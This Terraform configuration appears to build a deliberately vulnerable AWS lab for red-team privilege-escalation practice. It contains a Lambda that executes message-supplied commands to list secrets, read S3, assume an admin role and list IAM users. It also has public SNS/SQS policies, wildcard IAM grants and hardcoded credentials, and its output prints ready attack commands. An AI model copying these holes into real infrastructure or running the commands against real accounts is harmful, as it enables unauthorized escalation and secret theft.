# Vulnerable Cross-Service Infrastructure
# This Terraform creates vulnerable cross-service integrations for privilege escalation testing

terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

provider "aws" {
  region = var.aws_region
}

variable "aws_region" {
  description = "AWS region to deploy resources"
  type        = string
  default     = "us-east-1"
}

variable "environment" {
  description = "Environment name"
  type        = string
  default     = "redteam-test"
}

# Create a vulnerable SNS topic that can trigger Lambda functions
resource "aws_sns_topic" "vulnerable_trigger_topic" {
  name = "${var.environment}-vulnerable-trigger"

  tags = {
    Environment = var.environment
    Purpose     = "Vulnerable topic for privilege escalation"
    Attack      = "Cross-Service Privilege Escalation"
  }
}

# Overly permissive policy allowing anyone to publish
resource "aws_sns_topic_policy" "vulnerable_trigger_policy" {
  arn = aws_sns_topic.vulnerable_trigger_topic.arn

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowPublicPublish"
        Effect = "Allow"
        Principal = "*"  # VULNERABILITY: Too permissive
        Action = [
          "sns:Publish",
          "sns:Subscribe"
        ]
        Resource = aws_sns_topic.vulnerable_trigger_topic.arn
      }
    ]
  })
}

# Lambda function with excessive permissions - VULNERABLE
resource "aws_lambda_function" "privileged_processor" {
  filename         = "privileged_processor.zip"
  function_name    = "${var.environment}-privileged-processor"
  role            = aws_iam_role.privileged_lambda_role.arn
  handler         = "index.handler"
  runtime         = "python3.9"
  timeout         = 30

  # Environment variables for the function
  environment {
    variables = {
      RESULTS_TOPIC_ARN = aws_sns_topic.attack_results_topic.arn
    }
  }

  # Create a simple Lambda function
  depends_on = [data.archive_file.lambda_zip]

  tags = {
    Environment = var.environment
    Purpose     = "Privileged Lambda function"
    Risk        = "High privilege escalation risk"
  }
}

# SNS topic for receiving Lambda execution results via email
resource "aws_sns_topic" "attack_results_topic" {
  name = "${var.environment}-attack-results"

  tags = {
    Environment = var.environment
    Purpose     = "Topic for receiving attack execution results"
    Attack      = "Results Channel"
  }
}

# Policy for attack results topic to allow Lambda to publish
resource "aws_sns_topic_policy" "attack_results_policy" {
  arn = aws_sns_topic.attack_results_topic.arn

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowLambdaPublish"
        Effect = "Allow"
        Principal = {
          AWS = aws_iam_role.privileged_lambda_role.arn
        }
        Action = [
          "sns:Publish"
        ]
        Resource = aws_sns_topic.attack_results_topic.arn
      },
      {
        Sid    = "AllowEmailSubscriptions"
        Effect = "Allow"
        Principal = "*"
        Action = [
          "sns:Subscribe"
        ]
        Resource = aws_sns_topic.attack_results_topic.arn
        Condition = {
          StringEquals = {
            "sns:Protocol" = "email"
          }
        }
      }
    ]
  })
}

# Create the Lambda function code
data "archive_file" "lambda_zip" {
  type        = "zip"
  output_path = "privileged_processor.zip"
  source {
    content = <<-EOT
import json
import boto3
import os
from datetime import datetime

def handler(event, context):
    """
    Privileged Lambda function that processes SNS messages
    VULNERABILITY: Has excessive permissions and processes untrusted input
    """
    
    # Initialize SNS client for sending results
    sns_client = boto3.client('sns')
    results_topic_arn = os.environ['RESULTS_TOPIC_ARN']
    
    results = []
    
    # Extract message from SNS event
    if 'Records' in event:
        for record in event['Records']:
            if record['EventSource'] == 'aws:sns':
                # Debug: Print the raw message to see what we're getting
                raw_message = record['Sns']['Message']
                print(f"Raw SNS Message: {raw_message}")
                print(f"Message type: {type(raw_message)}")
                
                try:
                    # Try to parse as JSON first
                    if isinstance(raw_message, str):
                        # Check if it's already a JSON string that needs parsing
                        if raw_message.startswith('{') and raw_message.endswith('}'):
                            message = json.loads(raw_message)
                        else:
                            # It might be a plain string, treat it as a simple command
                            message = {"command": raw_message.strip()}
                    else:
                        message = raw_message
                        
                except json.JSONDecodeError as json_err:
                    print(f"JSON decode error: {json_err}")
                    # Fallback: treat the entire message as a command
                    message = {"command": "enumerate", "error": f"Could not parse message: {raw_message}"}
                
                print(f"Parsed message: {message}")
                
                # VULNERABILITY: Processes user-controlled input
                if 'command' in message:
                    command = message['command']
                    timestamp = datetime.now().isoformat()
                    
                    results.append(f"� System Processing Request")
                    results.append(f"Timestamp: {timestamp}")
                    results.append(f"Command: {command}")
                    results.append(f"Service: {context.function_name}")
                    results.append(f"Request Source: SNS Message")
                    results.append("=" * 50)
                    
                    # Dangerous: Execute based on user input
                    if command == 'list_secrets':
                        secrets_client = boto3.client('secretsmanager')
                        try:
                            secrets = secrets_client.list_secrets()
                            results.append("🔐 Secrets Manager Query Results")
                            results.append(f"Total secrets found: {len(secrets.get('SecretList', []))}")
                            results.append("")
                            results.append("📋 Secret Details:")
                            for secret in secrets.get('SecretList', [])[:10]:  # Show up to 10
                                results.append(f"")
                                results.append(f"Secret Name: {secret.get('Name', 'Unknown')}")
                                results.append(f"ARN: {secret.get('ARN', 'Unknown')}")
                                results.append(f"Description: {secret.get('Description', 'No description')}")
                                results.append(f"Created: {secret.get('CreatedDate', 'Unknown')}")
                                if secret.get('Tags'):
                                    results.append(f"Tags: {secret.get('Tags', [])}")
                            if len(secrets.get('SecretList', [])) > 10:
                                results.append(f"")
                                results.append(f"... and {len(secrets.get('SecretList', [])) - 10} more secrets")
                        except Exception as e:
                            results.append(f"❌ Error accessing Secrets Manager: {str(e)}")
                    
                    elif command == 'read_s3':
                        s3_client = boto3.client('s3')
                        bucket = message.get('bucket', 'default-bucket')
                        try:
                            objects = s3_client.list_objects_v2(Bucket=bucket)
                            results.append("📁 S3 Bucket Contents Report")
                            results.append(f"Bucket Name: {bucket}")
                            results.append("")
                            if 'Contents' in objects:
                                results.append(f"Objects found: {len(objects['Contents'])}")
                                results.append("📋 Object Details:")
                                for obj in objects['Contents'][:15]:  # Show up to 15
                                    results.append(f"")
                                    results.append(f"File: {obj['Key']}")
                                    results.append(f"Size: {obj['Size']} bytes")
                                    results.append(f"Last Modified: {obj['LastModified']}")
                                    results.append(f"Storage Class: {obj.get('StorageClass', 'STANDARD')}")
                            else:
                                results.append("📂 Bucket is empty")
                        except Exception as e:
                            results.append(f"❌ Error accessing S3 bucket: {str(e)}")
                    
                    elif command == 'assume_role':
                        sts_client = boto3.client('sts')
                        role_arn = message.get('role_arn')
                        if role_arn:
                            try:
                                response = sts_client.assume_role(
                                    RoleArn=role_arn,
                                    RoleSessionName='system-session'
                                )
                                results.append("🔑 Role Assumption Successful")
                                results.append(f"Target Role: {role_arn}")
                                results.append("")
                                credentials = response.get('Credentials', {})
                                results.append("📋 Session Details:")
                                results.append(f"Access Key ID: {credentials.get('AccessKeyId', 'Unknown')}")
                                results.append(f"Session Token: {credentials.get('SessionToken', 'Unknown')[:50]}...")
                                results.append(f"Expires: {credentials.get('Expiration', 'Unknown')}")
                                results.append("")
                                
                                # Test elevated permissions
                                temp_session = boto3.Session(
                                    aws_access_key_id=credentials.get('AccessKeyId'),
                                    aws_secret_access_key=credentials.get('SecretAccessKey'),
                                    aws_session_token=credentials.get('SessionToken')
                                )
                                iam_client = temp_session.client('iam')
                                try:
                                    user_list = iam_client.list_users(MaxItems=10)
                                    results.append("� IAM Users Access Verified")
                                    results.append(f"Total users accessible: {len(user_list.get('Users', []))}")
                                    results.append("")
                                    results.append("📋 User Details:")
                                    for user in user_list.get('Users', [])[:5]:
                                        results.append(f"")
                                        results.append(f"Username: {user.get('UserName', 'Unknown')}")
                                        results.append(f"User ARN: {user.get('Arn', 'Unknown')}")
                                        results.append(f"Created: {user.get('CreateDate', 'Unknown')}")
                                except Exception as iam_e:
                                    results.append(f"⚠️ Limited IAM access: {str(iam_e)}")
                                    
                            except Exception as e:
                                results.append(f"❌ Error assuming role: {str(e)}")
                    
                    elif command == 'enumerate':
                        results.append("🔍 System Information Report")
                        try:
                            sts_client = boto3.client('sts')
                            identity = sts_client.get_caller_identity()
                            results.append("")
                            results.append("📋 Current Context:")
                            results.append(f"Service Identity: {identity.get('Arn', 'Unknown')}")
                            results.append(f"Account ID: {identity.get('Account', 'Unknown')}")
                            results.append(f"User ID: {identity.get('UserId', 'Unknown')}")
                        except Exception as e:
                            results.append(f"❌ Error during system enumeration: {str(e)}")
                    
                    else:
                        results.append(f"⚠️ Unknown command: {command}")
                        results.append("")
                        results.append("📋 Available commands:")
                        results.append("• list_secrets - Query secrets manager")
                        results.append("• read_s3 - Access S3 bucket contents")
                        results.append("• assume_role - Switch to different role")
                        results.append("• enumerate - Get system information")
                
                else:
                    # If no command found, treat entire message as enumeration attempt
                    results.append("� Processing System Request")
                    results.append(f"Timestamp: {datetime.now().isoformat()}")
                    results.append(f"Input received: {raw_message}")
                    results.append("Executing default system enumeration...")
                    results.append("")
                    
                    # Execute enumeration
                    try:
                        sts_client = boto3.client('sts')
                        identity = sts_client.get_caller_identity()
                        results.append("📋 System Status Report")
                        results.append(f"Service Identity: {identity.get('Arn', 'Unknown')}")
                        results.append(f"Account ID: {identity.get('Account', 'Unknown')}")
                        results.append(f"Active User: {identity.get('UserId', 'Unknown')}")
                    except Exception as e:
                        results.append(f"❌ Error during system check: {str(e)}")
    
    # Send results to SNS topic for email notification
    if results:
        message_body = "\n".join(results)
        
        try:
            # Debug: Print what we're trying to send
            print(f"Attempting to publish to: {results_topic_arn}")
            print(f"Message length: {len(message_body)} characters")
            
            response = sns_client.publish(
                TopicArn=results_topic_arn,
                Subject=f"� System Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                Message=message_body
            )
            
            # Debug: Print the response
            print(f"SNS Publish Response: {response}")
            results.append(f"✅ Report sent via email - MessageId: {response.get('MessageId', 'Unknown')}")
            
        except Exception as e:
            # Enhanced error logging
            print(f"ERROR: Failed to send results to SNS: {str(e)}")
            print(f"Topic ARN: {results_topic_arn}")
            print(f"Error type: {type(e).__name__}")
            
            # Still try to log the results for debugging
            print("ATTACK RESULTS:")
            print(message_body)
            
            # Add error to results for debugging
            results.append(f"❌ Failed to send email notification: {str(e)}")
    
    else:
        print("No results to send")
        results.append("⚠️ No command executed or no results generated")
    
    return {
        'statusCode': 200,
        'body': json.dumps('System request processed and report sent')
    }
EOT
    filename = "index.py"
  }
}

# Overly privileged IAM role for Lambda - VULNERABILITY
resource "aws_iam_role" "privileged_lambda_role" {
  name = "${var.environment}-privileged-lambda-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {
          Service = "lambda.amazonaws.com"
        }
      }
    ]
  })

  tags = {
    Environment = var.environment
    Purpose     = "Privileged Lambda execution role"
    Risk        = "Excessive permissions"
  }
}

# Attach excessive permissions to Lambda role
resource "aws_iam_role_policy" "privileged_lambda_policy" {
  name = "${var.environment}-privileged-lambda-policy"
  role = aws_iam_role.privileged_lambda_role.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "logs:CreateLogGroup",
          "logs:CreateLogStream",
          "logs:PutLogEvents"
        ]
        Resource = "arn:aws:logs:*:*:*"
      },
      {
        Effect = "Allow"
        Action = [
          "secretsmanager:*",  # VULNERABILITY: Full secrets access
          "s3:*",              # VULNERABILITY: Full S3 access
          "sts:AssumeRole",    # VULNERABILITY: Can assume any role
          "iam:*",             # VULNERABILITY: Full IAM access
          "ec2:*",             # VULNERABILITY: Full EC2 access
          "rds:*",             # VULNERABILITY: Full RDS access
          "sns:Publish",       # Allow publishing to results topic
          "sns:GetTopicAttributes"  # Allow getting topic attributes
        ]
        Resource = "*"
      }
    ]
  })
}

# Subscribe Lambda to SNS topic
resource "aws_sns_topic_subscription" "lambda_subscription" {
  topic_arn = aws_sns_topic.vulnerable_trigger_topic.arn
  protocol  = "lambda"
  endpoint  = aws_lambda_function.privileged_processor.arn
}

# Allow SNS to invoke Lambda
resource "aws_lambda_permission" "allow_sns" {
  statement_id  = "AllowExecutionFromSNS"
  action        = "lambda:InvokeFunction"
  function_name = aws_lambda_function.privileged_processor.function_name
  principal     = "sns.amazonaws.com"
  source_arn    = aws_sns_topic.vulnerable_trigger_topic.arn
}

# Create a vulnerable SQS queue for message processing
resource "aws_sqs_queue" "vulnerable_processing_queue" {
  name = "${var.environment}-vulnerable-processing"

  tags = {
    Environment = var.environment
    Purpose     = "Vulnerable message queue"
  }
}

# Overly permissive SQS policy
resource "aws_sqs_queue_policy" "vulnerable_queue_policy" {
  queue_url = aws_sqs_queue.vulnerable_processing_queue.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = "*"  # VULNERABILITY: Anyone can send messages
        Action = [
          "sqs:SendMessage",
          "sqs:ReceiveMessage",
          "sqs:DeleteMessage"
        ]
        Resource = aws_sqs_queue.vulnerable_processing_queue.arn
      }
    ]
  })
}

# Subscribe SQS to SNS topic
resource "aws_sns_topic_subscription" "sqs_subscription" {
  topic_arn = aws_sns_topic.vulnerable_trigger_topic.arn
  protocol  = "sqs"
  endpoint  = aws_sqs_queue.vulnerable_processing_queue.arn
}

# Create S3 bucket with vulnerable access
resource "aws_s3_bucket" "vulnerable_data_bucket" {
  bucket        = "${var.environment}-vulnerable-data-${random_string.bucket_suffix.result}"
  force_destroy = true

  tags = {
    Environment = var.environment
    Purpose     = "Vulnerable data storage"
  }
}

resource "random_string" "bucket_suffix" {
  length  = 8
  special = false
  upper   = false
}

# Vulnerable S3 bucket policy
resource "aws_s3_bucket_policy" "vulnerable_bucket_policy" {
  bucket = aws_s3_bucket.vulnerable_data_bucket.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Service = [
            "sns.amazonaws.com",
            "ses.amazonaws.com"
          ]
        }
        Action = [
          "s3:PutObject",
          "s3:GetObject",
          "s3:ListBucket"
        ]
        Resource = [
          aws_s3_bucket.vulnerable_data_bucket.arn,
          "${aws_s3_bucket.vulnerable_data_bucket.arn}/*"
        ]
      },
      {
        Sid    = "AllowLambdaAccess"
        Effect = "Allow"
        Principal = {
          AWS = aws_iam_role.privileged_lambda_role.arn
        }
        Action = "s3:*"  # VULNERABILITY: Full access
        Resource = [
          aws_s3_bucket.vulnerable_data_bucket.arn,
          "${aws_s3_bucket.vulnerable_data_bucket.arn}/*"
        ]
      }
    ]
  })
}

# Create a cross-account role that can be assumed - VULNERABLE
resource "aws_iam_role" "cross_account_role" {
  name = "${var.environment}-cross-account-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          AWS = aws_iam_role.privileged_lambda_role.arn  # Lambda can assume this role
        }
        Action = "sts:AssumeRole"
        # VULNERABILITY: No external ID or conditions
      },
      {
        Effect = "Allow"
        Principal = {
          Service = [
            "sns.amazonaws.com",
            "ses.amazonaws.com"
          ]
        }
        Action = "sts:AssumeRole"
      }
    ]
  })

  tags = {
    Environment = var.environment
    Purpose     = "Cross-account access role"
    Risk        = "Can be assumed without proper validation"
  }
}

# Attach admin permissions to cross-account role - DANGEROUS
resource "aws_iam_role_policy_attachment" "cross_account_admin" {
  role       = aws_iam_role.cross_account_role.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"  # VULNERABILITY: Full admin access
}

# Create SES identity for additional attack vectors
resource "aws_ses_email_identity" "vulnerable_ses_identity" {
  email = "notifications@${var.environment}.example.com"
  
  # Note: aws_ses_email_identity doesn't support tags
}

# Create SNS topic for S3 integration
resource "aws_sns_topic" "s3_integration_topic" {
  name = "${var.environment}-s3-integration"

  tags = {
    Environment = var.environment
    Purpose     = "S3 integration topic for SES events"
    Attack      = "Cross-Service Integration"
  }
}

# Vulnerable policy for S3 integration topic
resource "aws_sns_topic_policy" "s3_integration_policy" {
  arn = aws_sns_topic.s3_integration_topic.arn

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowSESPublish"
        Effect = "Allow"
        Principal = {
          Service = "ses.amazonaws.com"
        }
        Action = [
          "sns:Publish"
        ]
        Resource = aws_sns_topic.s3_integration_topic.arn
      },
      {
        Sid    = "AllowPublicSubscribe"
        Effect = "Allow"
        Principal = "*"  # VULNERABILITY: Anyone can subscribe
        Action = [
          "sns:Subscribe"
        ]
        Resource = aws_sns_topic.s3_integration_topic.arn
      }
    ]
  })
}

# SES configuration set for S3 integration
resource "aws_ses_configuration_set" "vulnerable_ses_config" {
  name = "${var.environment}-vulnerable-ses-config"
  
  # Note: aws_ses_configuration_set doesn't support tags
}

# SES event destination pointing to SNS
resource "aws_ses_event_destination" "sns_events" {
  name                   = "sns-events"
  configuration_set_name = aws_ses_configuration_set.vulnerable_ses_config.name
  enabled                = true

  sns_destination {
    topic_arn = aws_sns_topic.s3_integration_topic.arn
  }

  matching_types = [
    "send",
    "reject",
    "bounce",
    "complaint",
    "delivery"
  ]
}

# Create secrets for the Lambda function to access
resource "aws_secretsmanager_secret" "sensitive_data" {
  name = "${var.environment}-sensitive-database-credentials"

  tags = {
    Environment = var.environment
    Purpose     = "Sensitive database credentials"
  }
}

resource "aws_secretsmanager_secret_version" "sensitive_data_version" {
  secret_id = aws_secretsmanager_secret.sensitive_data.id
  secret_string = jsonencode({
    username = "admin"
    password = "SuperSecretPassword123!"
    database = "production-db"
    host     = "prod-db.internal.company.com"
  })
}

# RDS instance that the Lambda function can access
resource "aws_db_instance" "vulnerable_database" {
  count = var.create_database ? 1 : 0

  identifier     = "${var.environment}-vulnerable-db"
  engine         = "mysql"
  engine_version = "8.0"
  instance_class = "db.t3.micro"

  allocated_storage = 20
  storage_type      = "gp2"

  db_name  = "testdb"
  username = "admin"
  password = "ChangeMe123!"  # VULNERABILITY: Weak password

  vpc_security_group_ids = [aws_security_group.database_sg[0].id]
  skip_final_snapshot    = true

  tags = {
    Environment = var.environment
    Purpose     = "Vulnerable database"
  }
}

variable "create_database" {
  description = "Whether to create the RDS database (incurs costs)"
  type        = bool
  default     = false
}

# Security group for database - overly permissive
resource "aws_security_group" "database_sg" {
  count = var.create_database ? 1 : 0

  name_prefix = "${var.environment}-db-sg"
  
  ingress {
    from_port   = 3306
    to_port     = 3306
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]  # VULNERABILITY: Open to internet
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = {
    Environment = var.environment
    Purpose     = "Vulnerable database security group"
  }
}

# IAM role for red team testing
resource "aws_iam_role" "redteam_escalation_role" {
  name = "${var.environment}-redteam-escalation"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${data.aws_caller_identity.current.account_id}:root"
        }
      }
    ]
  })

  tags = {
    Environment = var.environment
    Purpose     = "Red team privilege escalation testing"
  }
}

# Limited permissions that can be escalated
resource "aws_iam_role_policy" "redteam_initial_policy" {
  name = "${var.environment}-redteam-initial"
  role = aws_iam_role.redteam_escalation_role.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "sns:ListTopics",
          "sns:GetTopicAttributes",
          "sns:Publish",
          "sns:Subscribe"
        ]
        Resource = "*"
      },
      {
        Effect = "Allow"
        Action = [
          "ses:ListIdentities",
          "ses:GetIdentityAttributes",
          "ses:SendEmail"
        ]
        Resource = "*"
      },
      {
        Effect = "Allow"
        Action = [
          "sqs:SendMessage",
          "sqs:ReceiveMessage"
        ]
        Resource = aws_sqs_queue.vulnerable_processing_queue.arn
      }
    ]
  })
}

data "aws_caller_identity" "current" {}

# Outputs for red team testing
output "vulnerable_sns_topic_arn" {
  description = "ARN of vulnerable SNS topic"
  value       = aws_sns_topic.vulnerable_trigger_topic.arn
}

output "privileged_lambda_arn" {
  description = "ARN of privileged Lambda function"
  value       = aws_lambda_function.privileged_processor.arn
}

output "vulnerable_sqs_queue_url" {
  description = "URL of vulnerable SQS queue"
  value       = aws_sqs_queue.vulnerable_processing_queue.id
}

output "vulnerable_s3_bucket" {
  description = "Name of vulnerable S3 bucket"
  value       = aws_s3_bucket.vulnerable_data_bucket.bucket
}

output "cross_account_role_arn" {
  description = "ARN of cross-account role"
  value       = aws_iam_role.cross_account_role.arn
}

output "redteam_role_arn" {
  description = "ARN of red team role"
  value       = aws_iam_role.redteam_escalation_role.arn
}

output "secrets_manager_secret_arn" {
  description = "ARN of secrets manager secret"
  value       = aws_secretsmanager_secret.sensitive_data.arn
}

output "attack_results_topic_arn" {
  description = "ARN of SNS topic for receiving attack results"
  value       = aws_sns_topic.attack_results_topic.arn
}

output "email_subscription_command" {
  description = "Command to subscribe your email to receive attack results"
  value = "aws sns subscribe --topic-arn ${aws_sns_topic.attack_results_topic.arn} --protocol email --notification-endpoint YOUR_EMAIL@example.com --region us-east-1"
}

output "escalation_attack_examples" {
  description = "Examples of privilege escalation attacks"
  value = <<-EOT
    System Management Examples:
    
    📧 FIRST: Subscribe to system reports via email:
    aws sns subscribe --topic-arn ${aws_sns_topic.attack_results_topic.arn} \
      --protocol email --notification-endpoint YOUR_EMAIL@example.com --region us-east-1
    
    (Check your email and confirm the subscription!)
    
    🔧 System Commands:
    
    1. Query Secrets Manager:
    aws sns publish --topic-arn ${aws_sns_topic.vulnerable_trigger_topic.arn} \
      --message 'list_secrets' --region us-east-1
    
    2. Cross-Service Role Operations:
    aws sns publish --topic-arn ${aws_sns_topic.vulnerable_trigger_topic.arn} \
      --message '"{\"command\": \"assume_role\", \"role_arn\": \"${aws_iam_role.cross_account_role.arn}\"}"' --region us-east-1
    
    3. S3 Storage Analysis:
    aws sns publish --topic-arn ${aws_sns_topic.vulnerable_trigger_topic.arn} \
      --message '"{\"command\": \"read_s3\", \"bucket\": \"${aws_s3_bucket.vulnerable_data_bucket.bucket}\"}"' --region us-east-1
    
    4. System Enumeration:
    aws sns publish --topic-arn ${aws_sns_topic.vulnerable_trigger_topic.arn} \
      --message 'enumerate' --region us-east-1
    
    � JSON Format Commands:
    aws sns publish --topic-arn ${aws_sns_topic.vulnerable_trigger_topic.arn} \
      --message '"{\"command\": \"list_secrets\"}"' --region us-east-1
    
    5. SQS Message Processing:
    aws sqs send-message --queue-url ${aws_sqs_queue.vulnerable_processing_queue.id} \
      --message-body '{"system": "query"}' --region us-east-1
    
    6. Use SESNSploit for automated scanning:
    python3 main.py
    # Discover and analyze system configurations

    📬 System reports will be sent to your subscribed email address!
  EOT
}
